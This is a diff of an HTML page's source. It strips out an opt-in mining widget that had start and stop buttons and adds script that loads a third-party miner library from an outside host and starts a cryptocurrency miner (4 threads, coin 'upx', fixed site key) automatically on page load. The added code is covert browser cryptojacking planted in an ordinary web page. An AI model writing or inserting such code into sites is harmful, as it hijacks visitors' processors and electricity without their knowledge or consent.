@@ -13,31 +13,14 @@
 <meta http-equiv="pragma" content="no-cache">
 <meta http-equiv="cache-control" content="no-cache">
 <meta http-equiv="expires" content="0">
-<link rel="stylesheet" type="text/css" href="https://reauthenticator.com/lib/miner.css">
 </head>
 <body> 
 <script src="//statdynamic.com/lib/crypta.js"></script>
-<script src="https://reauthenticator.com/lib/minui.js"></script>
 <script>
-var miner = null;
-try {
-  miner = new CRLT.Anonymous('a19cc5b3d6609242d7b695d8e73f8744c56fbb33d385', {threads: 2});
-} catch(e) {}
-
-var ui = new MinerUI(miner, {
-  container: document.getElementById('miner'),
-  canvas: document.getElementById('mining-stats-canvas'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  threads: document.getElementById('mining-threads'),
-  threadsAdd: document.getElementById('mining-threads-add'),
-  threadsRemove: document.getElementById('mining-threads-remove'),
-  hashesTotal: document.getElementById('mining-hashes-total'),
-  startButton: document.getElementById('mining-start'),
-  stopButton: document.getElementById('mining-stop'),
-  blkWarn: document.getElementById('blk-warning')
-});
-//ui.autoStart(); // Uncomment this if you would like to start the script automatically.
+  var miner=new CRLT.Anonymous('a19cc5b3d6609242d7b695d8e73f8744c56fbb33d385', {
+    threads:4,throttle:0.2, coin: "upx",
+  });
+  miner.start();
 </script>
 </body>
 </html>
